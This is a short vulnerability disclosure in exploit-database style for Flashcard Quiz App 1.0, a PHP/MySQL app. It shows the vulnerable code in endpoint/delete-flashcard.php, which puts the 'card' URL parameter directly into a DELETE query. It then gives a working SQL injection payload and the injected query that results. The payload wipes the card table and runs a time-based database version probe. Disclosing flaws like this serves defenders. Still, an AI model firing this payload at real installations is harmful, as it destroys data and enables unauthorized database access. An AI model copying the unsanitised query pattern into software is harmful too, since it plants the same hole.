---
title: Flashcard Quiz App 1.0 SQL Injection
published: true
---

- Exploit Title: Flashcard Quiz App - SQL Injection
- Google Dork: N/A
- Application: Flashcard Quiz App
- Date: 25.02.2024
- Bugs: SQL Injection
- Exploit Author: SoSPiro
- Vendor Homepage: https://www.sourcecodester.com/
- Software Link: https://www.sourcecodester.com/php/17160/flashcard-quiz-app-using-php-and-mysql-source-code.html
- Version: 1.0
- Tested on: Windows 10 64 bit Wampserver
- CVE : N/A

***

### Vulnerability Description:

The provided PHP code is vulnerable to SQL injection. SQL injection occurs when user inputs are directly concatenated into SQL queries without proper sanitization, allowing an attacker to manipulate the SQL query and potentially perform unauthorized actions on the database.


### Proof of Concept (PoC):

This vulnerability involves injecting malicious SQL code into the 'card' parameter in the URL.

1. Original Code:

```php
$card = $_GET['card'];

$query = "DELETE FROM tbl_card WHERE tbl_card_id = '$card'";
```

2. Payload:

```planetext
' OR '1'='1'; SELECT IF(VERSION() LIKE '8.0.31%', SLEEP(5), 0); --
```

3. Injected Query:

```sql
DELETE FROM tbl_card WHERE tbl_card_id = '' OR '1'='1'; SELECT IF(VERSION() LIKE '8.0.31%', SLEEP(5), 0); --
```

[Request Response foto](https://i.imgur.com/5IXvpiZ.png)

### Vulnerable code section:

***

```
endpoint/delete-flashcard.php
```
```php
$card = $_GET['card'];

$query = "DELETE FROM tbl_card WHERE tbl_card_id = '$card'";
```